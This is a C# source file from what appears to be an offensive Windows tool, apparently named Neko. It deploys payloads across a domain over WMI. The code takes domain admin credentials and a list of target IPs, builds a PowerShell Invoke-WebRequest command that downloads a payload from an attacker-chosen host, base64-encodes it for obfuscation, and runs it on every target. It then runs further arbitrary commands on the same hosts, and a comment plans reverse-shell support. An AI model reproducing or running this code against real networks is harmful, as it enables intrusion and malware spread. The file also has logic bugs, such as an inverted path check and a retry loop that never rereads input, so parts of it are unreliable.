using System;
using System.Text;

namespace Neko.Execution
{
    class WMIDeployment
    {
        public static void Deploy()
        {
            //Confirm that this is correct
            Console.WriteLine("\r\n" +
                "Launch payload or create other processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
            string targetWmi = Console.ReadLine();

            while (targetWmi != "y" && targetWmi != "n" && targetWmi != "exit")
            {
                Console.WriteLine("\r\n" +
                    "Invalid command. Launch payload or create other processes on selected WMI targets? Enter 'y' or 'n' or 'exit':");
                targetWmi = Console.ReadLine();
            }
            if (targetWmi == "y")
            {
                //Check that user has domain admin creds
                Console.WriteLine("\r\n This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
                string hasDomain = Console.ReadLine();
                while (hasDomain != "y" && hasDomain != "n")
                {
                    Console.WriteLine("\r\n" +
                        "Invalid selection. This process requires Domain Admin credentials, proceed? Enter 'y' or 'n':");
                    hasDomain = Console.ReadLine();
                }
                if (hasDomain == "y")
                {
                    //Tell user their domain and confirm that this is the intended domain
                    Console.WriteLine("\r\n" +
                        "Your domain is: " + GetDomainInfo.DomainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
                    string domainConfirmation = Console.ReadLine();
                    while (domainConfirmation != "y" && domainConfirmation != "n")
                    {
                        Console.WriteLine("Invalid selection. Your domain is: " + GetDomainInfo.DomainURL + " Would you like to continue using this domain? Enter 'y' or 'n':");
                        domainConfirmation = Console.ReadLine();
                    }
                    if (domainConfirmation == "n")
                    {
                        Console.WriteLine("Please enter new domain to use:");
                        GetDomainInfo.DomainURL = Console.ReadLine();
                    }

                    //Get target list
                    Console.WriteLine("\r\n" +
                        "Enter IP addresses separated by commas:");
                    //Get IP targets
                    string ipTargets = Console.ReadLine();

                    //Split into array by commas
                    string[] ipSplit = ipTargets.Split(',');

                    //Declare command
                    string commandFile = "";

                    //Get website for payload
                    Console.WriteLine("\r\n" +
                        "Enter the domain or IP for where your payload is lcoated:");
                    string payloadURL = Console.ReadLine();

                    //Choose download path
                    Console.WriteLine("\r\n" + "Choose download location (leave blank for default path of C:\\ProgramData):");
                    string downloadPath = Console.ReadLine();
                    if (downloadPath != "")
                    {
                        downloadPath = @"C:\ProgramData";
                    }

                    //Choose FileName
                    Console.WriteLine("\r\n + Choose file name for download:");
                    string fileName = Console.ReadLine();

                    Console.WriteLine("\r\n" +
                        "Encoding commands for obfuscation");
                    string concattedCommand = "Invoke-WebRequest -Uri '" + payloadURL + "'" + "-UseBasicParsing -OutFile " + downloadPath + "\\" + fileName;

                    byte[] encoded = Encoding.Unicode.GetBytes(concattedCommand);
                    string obfuscatedCommand = Convert.ToBase64String(encoded);

                    //Get command from user
                    commandFile = "cmd.exe /c powershell -noninteractive -noprofile -encodedcommand " + obfuscatedCommand;
                    //Need to add - options for deploying payload from local machine and installing it on the targets' admin$ or c$; as well as reverse TCP Shell control

                    // Attack targets
                    foreach (string target in ipSplit)
                    {
                        UserChoices.WMIAttack.Parameters(DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, target, commandFile);
                    }

                    //Check if user wants to launch additional commands after payload installation
                    Console.WriteLine("\r\n" +
                        "Would you like to launch additional commands? Enter 'y' or 'n':");
                    string additionalCommands = Console.ReadLine();
                    while (additionalCommands != "y" && additionalCommands != "n")
                    {
                        Console.WriteLine("\r\n" +
                            "Invalid selection. Would you like to launch additional commands? Enter 'y' or 'n':");
                    }
                    if (additionalCommands == "y")
                    {
                        Console.WriteLine("\r\n" +
                            "Please enter additional commands, for instance, launching your payload with cmd.exe");
                        string additionalCommandLine = Console.ReadLine();

                        //Launching additional commands
                        Console.WriteLine("\r\n" +
                            "Executing additional commands: " + additionalCommandLine);
                        // Additional commands to attack targets
                        foreach (string target in ipSplit)
                        {
                            UserChoices.WMIAttack.Parameters(DomainAuthentication.Username, DomainAuthentication.Password, GetDomainInfo.DomainURL, target, additionalCommandLine);
                        }
                    }
                }
            }
        }
    }
}
